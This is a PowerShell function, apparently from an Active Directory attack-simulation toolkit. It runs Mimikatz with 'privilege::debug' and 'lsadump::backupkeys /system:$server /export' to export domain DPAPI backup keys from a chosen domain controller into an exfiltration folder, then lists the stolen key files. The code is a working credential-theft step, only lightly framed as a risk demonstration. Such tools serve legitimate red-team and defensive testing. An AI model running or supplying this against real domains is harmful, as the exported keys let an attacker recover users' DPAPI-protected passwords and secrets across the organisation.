<#
.SYNOPSIS
Attempts to export domain DPAPI backup keys from a selected domain controller and lists the exported files.

.FUNCTIONALITY
Attempts to export domain DPAPI backup keys from a selected domain controller and lists the exported files.
Demonstrates the risk of domain backup-key exposure for recovering user DPAPI master keys and protected secrets.
Recovery also requires the relevant encrypted data; this does not decrypt every secret on domain-joined machines.
#>
function Export-DPAPIMasterKey {

    ################################################################################
    #####                                                                      ##### 
    #####    Export DPAPI Master Key from a Domain Controller using Mimikatz.  #####                                
    #####                                                                      #####
    ################################################################################

    $Info = Measure-FunctionRuntime -Begin

    Write-AS2GoOutput -Type Header -Message "Export-DPAPIMasterKey"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

    New-Item $Script:DefautExfiltrationFolder -ItemType directory -ErrorAction Ignore
    
    $dn = Select-ADObject -DomainSelectionOnly -Title "Select Domain to get a Domain Controller for DPAPI Master Key Export"
    $server = Get-BestDomainController -domain $dn
    
    Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "cd $Script:DefautExfiltrationFolder" "privilege::debug" "lsadump::backupkeys /system:$server /export" "exit" }
    
    get-item "$Script:DefautExfiltrationFolder\ntds_*" | Sort-Object LastWriteTime -Descending | out-host
    
    Write-AS2GoOutput -type Success -Message "DPAPI Master Key Exported to $Script:DefautExfiltrationFolder from DC '$server'."
    
    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    
    Measure-FunctionRuntime -End -Details $Info
}